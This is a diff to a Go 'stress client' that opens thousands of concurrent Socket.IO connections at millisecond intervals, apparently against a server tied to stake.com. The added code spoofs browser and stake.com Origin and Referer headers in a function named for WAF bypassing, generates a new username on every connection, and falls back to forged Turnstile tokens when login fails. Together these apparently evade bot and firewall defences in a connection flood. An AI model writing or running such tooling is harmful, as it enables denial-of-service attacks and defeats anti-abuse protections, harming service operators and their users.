@@ -27,7 +27,7 @@ var (
 	LOCALE                 = "en"
 	PLATFORM               = "stake.com"
 	TOTAL_CLIENTS          = 10000 // 10,000 clients
-	CONCURRENT_CONNECTIONS = 7000 
+	CONCURRENT_CONNECTIONS = 7000  
 	RECONNECT_DELAY        = 1 * time.Millisecond
 	HEARTBEAT_INTERVAL     = 1 * time.Millisecond 
 	MAX_RETRY_BACKOFF      = 1 * time.Second
@@ -56,6 +56,11 @@ var httpClient = &http.Client{
 
 // Worker Semaphore to limit max workers
 var workerSemaphore = make(chan struct{}, MAX_WORKERS)
+
+func init() {
+	// Seed the random number generator so usernames are always unique on every run
+	rand.Seed(time.Now().UnixNano())
+}
 
 // ==========================================
 // TOKEN + USERNAME GENERATORS
@@ -110,8 +115,8 @@ type StressClient struct {
 func NewStressClient(id int) *StressClient {
 	return &StressClient{
 		clientID:        id,
-		username:        generateRandomUsername(),
-		authToken:       generateFakeTurnstileToken(),
+		username:        "", // Will be generated fresh on every connect
+		authToken:       "", 
 		connectionCycle: time.Duration(rand.Intn(30)+10) * time.Second, 
 		refreshInterval: REFRESH_INTERVAL + time.Duration(rand.Intn(10))*time.Millisecond,
 	}
@@ -126,17 +131,70 @@ func encodePayload(event string, data interface{}) (string, error) {
 	return fmt.Sprintf(`42["%s",%s]`, event, string(jsonBytes)), nil
 }
 
-func (c *StressClient) Connect() bool {
-	c.authToken = generateFakeTurnstileToken()
+// Helper function to set WAF-bypassing headers
+func setWAFHeaders(req *http.Request) {
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+	req.Header.Set("Origin", "https://stake.com")
+	req.Header.Set("Referer", "https://stake.com/settings/offers")
+	req.Header.Set("Accept", "application/json, text/plain, */*")
+}
 
-	// Handshake URL
+func (c *StressClient) Connect() bool {
+	// ==========================================
+	// GENERATE FRESH IDENTITY FOR EVERY ATTEMPT
+	// ==========================================
+	c.username = generateRandomUsername()
+	c.authToken = ""
+
+	// ==========================================
+	// 1. AUTHENTICATE WITH /api/login (Mimicking Python Bot)
+	// ==========================================
+	loginURL := fmt.Sprintf("%s/api/login", strings.TrimRight(SERVER_URL, "/"))
+	loginPayload := map[string]string{
+		"username": c.username,
+		"platform": PLATFORM,
+		"version":  VERSION,
+	}
+	jsonPayload, _ := json.Marshal(loginPayload)
+
+	loginReq, err := http.NewRequest("POST", loginURL, bytes.NewBuffer(jsonPayload))
+	if err == nil {
+		setWAFHeaders(loginReq)
+		loginReq.Header.Set("Content-Type", "application/json")
+
+		if loginResp, err := httpClient.Do(loginReq); err == nil {
+			bodyBytes, _ := io.ReadAll(loginResp.Body)
+			loginResp.Body.Close()
+
+			var respData map[string]interface{}
+			if json.Unmarshal(bodyBytes, &respData) == nil {
+				// Try to extract token just like the Python script does
+				if token, ok := respData["data"].(string); ok && token != "" {
+					c.authToken = token
+				} else if token, ok := respData["token"].(string); ok && token != "" {
+					c.authToken = token
+				} else if token, ok := respData["auth"].(string); ok && token != "" {
+					c.authToken = token
+				}
+			}
+		}
+	}
+
+	// Fallback to fake token if API fails or rejects us
+	if c.authToken == "" {
+		c.authToken = generateFakeTurnstileToken()
+	}
+
+	// ==========================================
+	// 2. SOCKET.IO HANDSHAKE
+	// ==========================================
 	handshakeURL := fmt.Sprintf("%s/socket.io/?EIO=4&transport=polling&user=%s", SERVER_URL, c.username)
 
 	req, err := http.NewRequest("GET", handshakeURL, nil)
 	if err != nil {
 		return false
 	}
-	req.Header.Set("User-Agent", "Go-Stress-Client/ULTRA")
+	setWAFHeaders(req)
 
 	resp, err := httpClient.Do(req)
 	if err != nil {
@@ -160,7 +218,7 @@ func (c *StressClient) Connect() bool {
 		return false
 	}
 
-	// Send Auth Packet to establish the session in the app layer
+	// Send Auth Packet to establish the session in the app layer with the REAL token
 	authPayload := map[string]string{
 		"token":    c.authToken,
 		"username": c.username,
@@ -195,6 +253,7 @@ func (c *StressClient) sendRawPacket(data string) bool {
 	if err != nil {
 		return false
 	}
+	setWAFHeaders(req)
 	req.Header.Set("Content-Type", "text/plain;charset=UTF-8")
 
 	resp, err := httpClient.Do(req)
@@ -220,7 +279,7 @@ func (c *StressClient) Poll() {
 	if err != nil {
 		return
 	}
-	req.Header.Set("User-Agent", "Go-Stress-Client/ULTRA")
+	setWAFHeaders(req)
 
 	resp, err := httpClient.Do(req)
 	if err != nil {
